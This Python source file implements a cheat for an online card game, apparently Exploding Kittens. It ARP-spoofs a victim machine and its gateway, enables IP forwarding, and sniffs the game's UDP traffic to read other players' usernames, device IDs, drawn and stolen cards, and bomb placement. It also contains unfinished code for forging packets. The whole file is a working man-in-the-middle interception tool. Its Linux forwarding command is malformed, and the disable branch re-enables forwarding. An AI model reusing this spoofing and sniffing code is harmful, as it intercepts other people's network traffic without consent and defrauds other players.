import logging
logging.basicConfig(level=logging.ERROR)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import (
        scapy,
        hexdump,
        sendp,
        send,
        ARP,
        sniff,
        AsyncSniffer,
        Raw,
        UDP,
        Ether
)
from scapy.config import conf
from scapy.layers.inet import IP
import re
import pprint
from Player import Player, Players
from threading import Thread, Lock
import netifaces
from getmac import get_mac_address
import inspect
import platform
import os
import sys


# 36 chrs
GUID = '[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}'

conf.use_pcap = True

regex_bstring = rf'playerIds.*?({GUID}).*?usernames[\x00-\xff]{{2}}(.*?)s\x00\x08.*?deviceIds.*?({GUID})s\x00.*?avatarIds\x00(.*?)\xff'.encode()
# player_id, username, did, len_and_avatarIds
REGEX_PLAYERS = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(AddPlayerToQueue)y.*?({GUID})\x00'.encode()
# This looks like message that confirms final list of players
# message, player_id
REGEX_PLAYERS_QUEUED = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(OpponentChosen).*?({GUID}).*?({GUID})\x00(.*?)WriteActivityMessagey'.encode()
# Steals
# action, player_id, player_id2, length_and_card
# {card}-{action} by {get_player_name(saved_players, player_id)} to {get_player_name(saved_players, opponent)}
REGEX_OPPONENTCHOSEN = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(PlayCard).*?({GUID})\x00(.*?)WriteActivityMessagey'.encode()
# action, player_id, length_and_card.
# Catches a players played card.
# Target hasn't been selected yet. TODO: Getting bad bytes in card field
REGEX_PLAYCARD_0 = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(?!.*WriteActivity)(PlayCard?)y\x00.*?({GUID})\x00([\x01-\xff].*)'.encode()
# action, player_id, length_and_card. Looking for DrawFromBottom TODO: Card field not 100% working
# Player action is still to playcard except some played cards have extra animation.
REGEX_PLAYCARD = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(DrawCard).*?({GUID})\x00([\x01-\xff].*)'.encode()
# action, player_id, len_and_card
REGEX_DRAWCARD = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(InsertCardInDeck).*?({GUID})\x00(.*?)\x00(.*)'.encode()
# action, player_id, length_n_card, length_n_ek_position
# Need to account of bytes representing ek placement position
REGEX_INSERTCARD = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(?!.*WriteActivity)(OpponentChosen).*?({GUID}).*?({GUID})\x00(.*)'.encode()
# Slaps
# action, player_id, player_id2, length_n_card
REGEX_OPPONENTCHOSEN2 = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(GiveSteal).*?({GUID}).*?({GUID})\x00([\x01-\xff].*)'.encode()
# action, player_id, plaer_id2, length_and_card
REGEX_XCHG = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(Emote).*?({GUID})\x00([\x01-\xff].*)'
# action, player_id, emote_len_and_emote
REGEX_EMOTE = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(GameStarted)y\x00'.encode()
# action
REGEX_STARTED = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(PlayerDied).*?({GUID})'.encode()
# action, player_id
REGEX_DIED = re.compile(regex_bstring, re.DOTALL)

regex_bstring = rf'(ReceivedNagPlayer)y\x00()()'
# TODO: action, player_id, player_id2
REGEX_NAG = re.compile(regex_bstring, re.DOTALL)

GAME_STATES = {
        'INIT': 1,
        'GAME_LOCKED': 2,
        'PLAYERS_READY': 3, #NOT USED 
        'STARTED': 4,
        }

pp = pprint.PrettyPrinter(indent=4)


class EkGameCheat:
    def __init__(self, **kwargs):
        # List of final players who will play.
        self.saved_players = Players() 
        # [{'player_id':'$840eb76e-aa1b-4345-978c-21919d189001s','player_names':['bob','carl'], 'cards':[]]
        # Collect data of potential players
        self.potential_players = Players()
        self.lock = Lock()
        self.VICTIM_IP = kwargs.get('victim_ip')
        self.SNIFF_INF = kwargs.get('sniff_inf')
        self.console_cb = kwargs.get('console_cb')
        self.status_cb = kwargs.get('status_cb')
        self.player_cb = kwargs.get('player_cb')

        self.GATEWAY_IP = kwargs.get('gateway_ip', self.getGatewayIp())
        self.VICTIM_MAC = kwargs.get('victim_mac', get_mac_address(hostname=f'{self.VICTIM_IP}'))
        self.GATEWAY_MAC = kwargs.get('gateway_mac', get_mac_address(hostname=f'{self.GATEWAY_IP}'))
        self.MY_IP = kwargs.get('my_ip', self.getIpAddress(self.SNIFF_INF))
        self.SNIFF_INF_MAC = kwargs.get('sniff_inf_mac', get_mac_address(interface=self.SNIFF_INF))

        self.game_state = GAME_STATES['INIT']
        self.game_actions = []
        self.pkt_count = 0
        self.console = ''
        self.game_state_cb = {}


    def updateConsole(self, message, call_back=None):
        self.console = message
        if call_back == None:
            call_back = self.console_cb

        if callable(call_back):
            call_back(data = message)


    def updateStatus(self, message, call_back=None):
        self.console = message
        if call_back == None:
            call_back = self.status_cb

        if callable(call_back):
            call_back(data = message)


    def setGameStateCb(self, state:str, cb:str=None):
        if state in GAME_STATES.keys():
            if callable(cb):
                self.game_state_cb[state] = cb

    def sendCb(self, **kwargs):

        def _sendCb(pkt):
            max_packet_size = 70 # bytes

            if not pkt.haslayer(IP):
                return

            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst

            if dst_ip == self.MY_IP:
                return
                
            if pkt.haslayer(UDP) and pkt.haslayer(Raw) and len(pkt[IP][UDP][Raw].load) > max_packet_size:
                # Increment packet count
                self.pkt_count += 1
                # self.updateStatus(f'Packet count {self.pkt_count}')

                # TODO: Messages should be parsed in resepct to game state.
                self.playOpponentChosen2(pkt)
                self.playRegisterPlayers(pkt)
                self.playAddPlayersToGame(pkt)
                self.playCard(pkt)
                self.playDrawCard(pkt)
                self.playInsertCard(pkt)
                self.playPlayCard(pkt)
                self.playOpponentChosen(pkt)
                self.playXchange(pkt)
                #self.playEmote()
                self.playStarted(pkt)
                self.playDied(pkt)

        return _sendCb


    def playAddPlayersToGame(self, pkt):
        # This message indicates that the game and final list of players have started
        final_players_found = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_PLAYERS_QUEUED)

        if final_players_found and len(final_players_found) > 0:
            self.finalizePlayers(self.potential_players, final_players_found)
            
            # Erase potential_players
            self.potential_players = Players()

            #message = pprint.pformat(inspect.getmembers(saved_players.players), indent=2)
            #save_to_file(f'\n{len(saved_players.players)}\n{final_players_found}\n{message}', 'dump.txt')


    def playCard(self, pkt):
        # action, player_id, length, card. Looking for DrawFromBottom
        played_card = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_PLAYCARD)
        if len(played_card) > 0:
            for action, player_id, length_n_card in played_card:
                card = self.getNextMessage(length_n_card)

                self.game_actions.append([action,player_id,card])
                logging.debug(f'PLAYCARD: {action} by {self.saved_players.get_player_name(player_id)} card {card}')
                self.updateConsole((
                        f'PLAYCARD: {action} by {self.saved_players.get_player_name(player_id)} card {card}'))
                # Remove card from player hand
                self.saved_players.remove_card(player_id, card)


    def playDrawCard(self, pkt):
        # action, player_id, len_and_card
        played_card = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_DRAWCARD)
        if len(played_card) > 0:
            for action, player_id, length_n_card in played_card:
                card = self.getNextMessage(length_n_card)

                logging.debug([action,player_id, card])
                self.game_actions.append([action, player_id, card])
                self.saved_players.save_card(player_id, card)
                self.updateConsole(f'{action} {self.saved_players.get_player_name(player_id)} {card}')


    def playInsertCard(self, pkt):
        # action, player_id, id, ek_pos.
        played_card = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_INSERTCARD)

        if len(played_card) > 0:
            for action, player_id, len_n_card, ek_pos in played_card:
                # Get bomb placement position
                ek_pos = self.getNextMessage(ek_pos)
                ek_pos = int(ek_pos) + 1 # More accurate

                card = self.getNextMessage(len_n_card)

                logging.debug(f'{action} by {self.saved_players.get_player_name(player_id)} {card} ek placed {ek_pos}')
                self.game_actions.append([action,player_id,card, ek_pos])
                self.updateConsole((
                        f'{action} by {self.saved_players.get_player_name(player_id)}'
                        f' {card} ek placed {ek_pos}'))


    def playOpponentChosen2(self, pkt):
        # action, player_id, id, ek_pos.
        played_card = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_OPPONENTCHOSEN2)

        if len(played_card) > 0:
            for action, player_id, gen_id, len_n_card in played_card:
                card = self.getNextMessage(len_n_card)
                logging.debug(f'{action} by {self.saved_players.get_player_name(player_id)} {self.saved_players.get_player_name(gen_id)}')
                self.game_actions.append([action,player_id,gen_id])
                self.updateConsole((
                        f'playOpponentChosen2: {action} by '
                        f'{self.saved_players.get_player_name(player_id)} '
                        f'{self.saved_players.get_player_name(gen_id)}, {card}'))


    def playPlayCard(self, pkt):
        # Played card
        played_card = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_PLAYCARD_0)

        if len(played_card) > 0:
            for action, player_id, length_n_card in played_card:
                card = self.getNextMessage(length_n_card)

                self.game_actions.append([action,player_id])
                # Remove card from player hand
                self.saved_players.remove_card(player_id, card)
                logging.debug(f'REGEX_PLAYCARD_0: {action} by {self.saved_players.get_player_name(player_id)} card {card}')
                self.updateConsole((
                        f'REGEX_PLAYCARD_0: {action} by '
                        f'{self.saved_players.get_player_name(player_id)} card {card}'))


    def playOpponentChosen(self, pkt):
        # Game activity 2, usually 2 player ids
        # This could be something like a slap.
        played_card = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_OPPONENTCHOSEN)

        if len(played_card) > 0:
            for action, player_id, opponent, length_and_card in played_card:
                card = self.getNextMessage(length_and_card)

                self.game_actions.append([player_id,card,opponent])
                self.saved_players.remove_card(opponent, card)
                logging.debug((
                        f'REGEX_OPPONENTCHOSEN1: card {card}'
                        f' by {self.saved_players.get_player_name(player_id)}'
                        f' to {self.saved_players.get_player_name(opponent)}'))            
                self.updateConsole((
                        f'playOpponentChosen: {action} card {card}'
                        f' by {self.saved_players.get_player_name(player_id)}'
                        f' to {self.saved_players.get_player_name(opponent)}'))


    def playRegisterPlayers(self, pkt):
        # Collect player details
        found_players = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_PLAYERS)
        if len(found_players) > 0:
            for player_id, username, did, len_and_avatarIds in found_players:
                avatarIds = self.getNextMessage(len_and_avatarIds)
                new_player = Player(
                        player_id = player_id,
                        names = [username],
                        device_id = did,
                        avatar_id = avatarIds,
                        hand = [],
                        display_cb = self.player_cb,
                )

                self.potential_players.save_player(new_player)
                logging.debug(f'Username: {username}, {player_id}, {avatarIds}, {did}')
                self.updateConsole(f'Username: {username}, {player_id}, {avatarIds}, {did}')
            

    def playXchange(self, pkt):
        # action, player_id, card
        played_card = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_XCHG)
        if len(played_card) > 0:
            for action, player_id, player_id2, length_n_card in played_card:
                card = self.getNextMessage(length_n_card)

                self.game_actions.append([action,player_id,card])
                self.saved_players.remove_card(player_id2, card)
                self.saved_players.save_card(player_id, card)
                logging.debug(f'REGEX_XCHG: {action} from {self.saved_players.get_player_name(player_id2)} to {self.saved_players.get_player_name(player_id)}  card {card}')
                self.updateConsole((
                        f'REGEX_XCHG: {action} from '
                        f'{self.saved_players.get_player_name(player_id2)} to '
                        f'{self.saved_players.get_player_name(player_id)}  card {card}'))


    def playDied(self, pkt):
        # action, player_id
        for action, player_id in self.containsAll(pkt[IP][UDP][Raw].load, REGEX_DIED):
            self.game_actions.append([action,player_id])
            self.updateConsole(f'REGEX_DIED: {action} {self.saved_players.get_player_name(player_id)}')


    def playStarted(self, pkt):
        # action, player_id
        for action in self.containsAll(pkt[IP][UDP][Raw].load, REGEX_STARTED):
            self.game_actions.append([action])
            self.updateConsole(f'REGEX_STARTED: {action}')
            self.game_state = GAME_STATES['STARTED']
            # Callback to ui maybe?
            self.game_state_cb['STARTED']()

    
    def playEmote(self, pkt):
        # Collect player emotes
        played_card = self.containsAll(pkt[IP][UDP][Raw].load, REGEX_EMOTE)
        if len(played_card) > 0:
            for action, player_id, emote_len_and_emote in played_card:
                emote = self.getNextMessage(emote_len_and_emote)
                #print(f'{action}: {get_player_name(saved_players, player_id)} sends {emote}')

                # Attempt to send fake emotes TODO: wip          
                if (self.saved_players.get_player_name(player_id) and
                        self.saved_players.get_player_name(player_id)[0].decode() in 'capn'):
                    #pkt.show()
                    del pkt[IP].chksum
                    del pkt[UDP].chksum
                    del pkt[IP].len
                    del pkt[UDP].len
                    del pkt[Ether].dst
                    del pkt[Ether].src
                    #pkt[UDP].load = EMOTE_DRUNK
                    #sendp(pkt)
                    #pkt.show2() # New checksum


    def finalizePlayers(self, potential_players:Players, player_ids:[] = []):
        '''Match player_ids to saved_players and return Players()
        Params:
        potential_players Players object.
        players_ids list of [(message, player_id)]. Must be less than total number of possible players in game (5).
        '''
        # Update console with player_ids found
        for message, player_id in player_ids:
            self.game_state = GAME_STATES['STARTED']
            self.updateConsole(f'{message}: {player_id}')

        # temp_players = Players() # Doesn't work. Need to explicitly set players to []
        temp_players = Players(players=[])
        self.updateConsole(f'finalizePlayers temp_players size is {len(temp_players.players)}')
        
        # Match player_id with Players.players list and copy to new Players().
        for message, final_player_id in player_ids:

            if player:= potential_players.get_player(final_player_id):
                # Reset player hand
                player.hand = [b'Defuse0.0']
                
                temp_players.save_player(player)

                idx = temp_players.get_index(player.player_id)
                # Wipe any gui forms if exist.
                self.updateConsole((
                        f'finalizePlayers match found: {player.names} {idx} '
                        f'out of {len(temp_players.players)} list {len(player_ids)}'))

        self.saved_players = temp_players
    
    
    def getGatewayIp(self):
        gws = netifaces.gateways()
        gw_ip = gws['default'][netifaces.AF_INET][0]

        return gw_ip
    
    
    def getIpAddress(self, iface):
        return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']


    def doSniff(self):
        BPF_EK_FILTER_EK = f'(udp port 5056)'
        # BPF_EK_FILTER_EK = f'(udp port 5056 or udp port 5055)'
        BPF_EK_FILTER_MAC = f'(ether dst {self.SNIFF_INF_MAC})'
        BPF_FILTER = f'{BPF_EK_FILTER_EK} and {BPF_EK_FILTER_MAC}'

        sniff(filter=BPF_FILTER, prn=self.sendCb(), iface=self.SNIFF_INF)

    def getNextMessage(self, len_and_message:bytes)->bytes:
        '''Extracts the length indicated in the first byte
        and extracts the next num of bytes following.
        '''
        mlen = len_and_message[:1]
        len_int = int.from_bytes(mlen, 'big')
        message = len_and_message[1:len_int + 1]

        return message


    def contains(self, data, regex)-> bool:
        search = regex.search(data)

        if search:
            return search.group(1)


    def containsAll(self, data, regex)-> bool:
        return regex.findall(data)


    def restore(self, dst_ip:str, src_ip:str):
        dst_mac = get_mac_address(hostname=f'{dst_ip}')
        src_mac = get_mac_address(hostname=f'{src_ip}')

        packet = ARP(
                op=2,
                pdst=dst_ip,
                hwdst=dst_mac,
                psrc=src_ip,
                hwsrc=src_mac)
        send(packet, count=4,verbose=False)


    def ipForwarding(self, enable:bool=False):
        my_os = platform.system()

        if enable:
            if my_os == 'Linux':
                os.system(f'sudo net.ipv4.ip_forward = 1')
            elif my_os == 'Darwin':
                os.system(f'sudo sysctl -w net.inet.ip.forwarding=1')
            elif my_os == 'Windows':
                raise('O/S not supported')
        else:
            if my_os == 'Linux':
                os.system(f'sudo net.ipv4.ip_forward = 1')
            elif my_os == 'Darwin':
                os.system(f'sudo sysctl -w net.inet.ip.forwarding=0')
            elif my_os == 'Windows':
                raise('O/S not supported')
            

    def spoofer(self, target_ip:str, spoof_ip:str):
        destination_mac = get_mac_address(hostname=f'{target_ip}')

        # Our mac will will be insert as the src mac.
        packet = ARP(
                op=2,
                pdst=target_ip,
                hwdst=destination_mac,
                psrc=spoof_ip)
        send(packet, verbose=False)


    def _saveToFile(self, data, filename):
        with open(filename, 'a') as fn:
            fn.write(data)
            